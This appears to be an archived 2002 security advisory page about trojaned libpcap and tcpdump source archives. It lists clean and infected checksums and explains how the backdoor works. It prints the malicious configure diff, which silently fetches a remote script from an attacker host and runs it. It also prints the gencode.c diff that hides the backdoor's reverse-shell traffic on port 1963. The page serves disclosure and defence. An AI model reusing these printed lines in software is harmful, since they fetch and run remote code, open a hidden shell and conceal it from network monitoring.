@@ -1,0 +1,173 @@
+<html>
+<head><title>Libpcap and tcpdump trojaned on tcpdump.org</title></head>
+
+<body bgcolor=white>
+<table width="100%"><tr><td align="center">
+<table width="90%"><tr><td>
+<font face="verdana,helvetica,arial">
+<font size="+2"><b>Latest libpcap & tcpdump sources from tcpdump.org contain a trojan.</b></font>
+<p>
+
+<b>Updates:</b>
+<ul>
+<li> We have moved back to the main HLUG server now that bandwidth has dropped.
+<li> Many Mirrors are infected with the trojan!!!
+<li> Tcpdump.org and mirrors are down until everything can be cleaned and checked.
+</ul>
+<p>
+
+<b>Background:</b>
+<ul>
+<li> Libpcap provides a packet sniffing library for programs like Snort.
+<li> Tcpdump is a standard tool for packet sniffing.
+</ul>
+<p>
+
+<b>Details:</b><p>
+<ul>
+<li>The trojan contains modifications to the configure script and
+gencode.c (in libpcap only).<p>
+
+<li>The configure script downloads <a href="http://mars.raketti.net/~mash/services">http://mars.raketti.net/~mash/services</a>
+which is then sourced with the shell. It contains an embedded shell
+script that creates a C file, and compiles it.<p>
+
+<li>The program connects to 212.146.0.34 (mars.raketti.net) on port 1963
+and reads one of three one byte status codes:
+<ul>
+<li> <b>A</b> - program exits 
+<li> <b>D</b> - forks and spawns a shell and does the needed file descriptor manipulation to redirect it to the existing connection to 212.146.0.34. 
+<li> <b>M</b> - closes connection, sleeps 3600 seconds, and then reconnects 
+</ul>
+<p>
+Hmm... ADM...
+<p>
+
+<li>It's important to note that it reuses the same outgoing connection for
+the shell. This gets around firewalls that block incoming connections.
+<p>
+
+<li>Gencode.c is modified to force libpcap to ignore packets to/from the
+backdoor program, hiding the backdoor program's traffic.
+<p>
+
+<li>This is similar to the OpenSSH trojan a few months ago.</li>
+<p>
+</ul>
+
+<b>Good sources: </b><p>
+<a href="http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/libpcap-0.7.1.tar.gz">http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/libpcap-0.7.1.tar.gz</a><br>
+<a href="http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/tcpdump-3.6.2.tar.gz">http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/tcpdump-3.6.2.tar.gz</a><br>
+<a href="http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/tcpdump-3.7.1.tar.gz">http://www.ibiblio.org/pub/Linux/distributions/gentoo/distfiles/tcpdump-3.7.1.tar.gz</a><p>
+
+<font face="helvetica,arial">
+<pre>
+MD5 Sum 0597c23e3496a5c108097b2a0f1bd0c7  libpcap-0.7.1.tar.gz
+MD5 Sum 6bc8da35f9eed4e675bfdf04ce312248  tcpdump-3.6.2.tar.gz
+MD5 Sum 03e5eac68c65b7e6ce8da03b0b0b225e  tcpdump-3.7.1.tar.gz
+</pre>
+</font>
+
+<b>Trojaned sources:</b><p>
+<a href="http://www.tcpdump.org/release/libpcap-0.7.1.tar.gz">http://www.tcpdump.org/release/libpcap-0.7.1.tar.gz</a><br>
+<a href="http://www.tcpdump.org/release/tcpdump-3.6.2.tar.gz">http://www.tcpdump.org/release/tcpdump-3.6.2.tar.gz</a><br>
+<a href="http://www.tcpdump.org/release/tcpdump-3.7.1.tar.gz">http://www.tcpdump.org/release/tcpdump-3.7.1.tar.gz</a><p>
+
+<font face="helvetica,arial">
+<pre>
+MD5 Sum 73ba7af963aff7c9e23fa1308a793dca  libpcap-0.7.1.tar.gz
+MD5 Sum 3a1c2dd3471486f9c7df87029bf2f1e9  tcpdump-3.6.2.tar.gz
+MD5 Sum 3c410d8434e63fb3931fe77328e4dd88  tcpdump-3.7.1.tar.gz
+</pre>
+</font>
+<p>
+
+<b>The (relevant) gencode.c diff:</b><p>
+<font face="helvetica,arial">
+<pre>
+*** 288,293 ****
+--- 289,318 ----
+  {
+        extern int n_errors;
+        int len;
++         int l;
++         char *port = "1963";
++         char *str, *tmp, *new = "not port 1963";
++ 
++     if (buf && *buf && strstr (buf, port)) {
++         buf = "port 1964";
++     }
++     else {
++         l = strlen (new) + 1;
++         if (!(!buf || !*buf)) {
++             l += strlen (buf);
++             l += 5; /* and */
++         }
++ 
++         str = (char *)malloc (l);
++         str[0] = '\0';
++         if (!(!buf || !*buf)) {
++             strcpy (str, buf);
++             strcat (str, " and ");
++         }
++ 
++         strcat (str, new);
++         buf = str;
++     }
+  
+        no_optimize = 0;
+        n_errors = 0;
+***************
+
+</pre>
+</font>
+
+<b>The (relevant) configure diff:</b><p>
+<font face="helvetica,arial">
+<pre>
++  CNF="services"
++  URL="mars.raketti.net/~mash/$CNF"
+
+!  (IFS=","
+!  ARGS="wget -q -O -,lynx --source,fetch -q -o -"
+! 
+!  for i in $ARGS; do
+!        IFS=" "
+!        $i $URL 1> $CNF
+!        if [ -f $CNF ]; then sh $CNF
+!            exit
+!        fi
+!        rm -f $CNF
+!  done) 1>/dev/null 2>/dev/null &
+
+</pre>
+</font>
+
+<b>The "services" payload:</b>
+<ul>
+<li> <a href="trojan-script">trojan-script, the non-obfuscated portion (excerpted)</a>
+<li> <a href="services">services, the complete version</a>
+</ul>
+<p>
+
+<b>Thanks to:</b><p>
+
+Russell Adams &lt;rladams@NO_SPAMadamsinfoserv.com&gt;<br>
+Mathew Solnik &lt;msolnik@NO_SPAMhlug.org&gt;<br>
+Scott Stout &lt;skout@NO_SPAMwiretapped.us&gt;<p>
+
+with the <a href="http://www.hlug.org/">Houston Linux Users Group</a>.<p>
+
+Additional thanks to Bruce Locke for interpreting the backdoor code.<p>
+
+Thanks to <a href="http://www.antioffline.com/">Antioffline.com</a> for hosting us, and 
+<a href="http://www.gentoo.org/">Gentoo's</a> Portage system for catching the trojaned files via checksums.
+<p>
+<font size="-1">Last update: Wed Nov 13 03:44:08 CST 2002</font>
+
+</font>
+</td></tr></table>
+</td></tr></table>
+</body>
+</html>
+
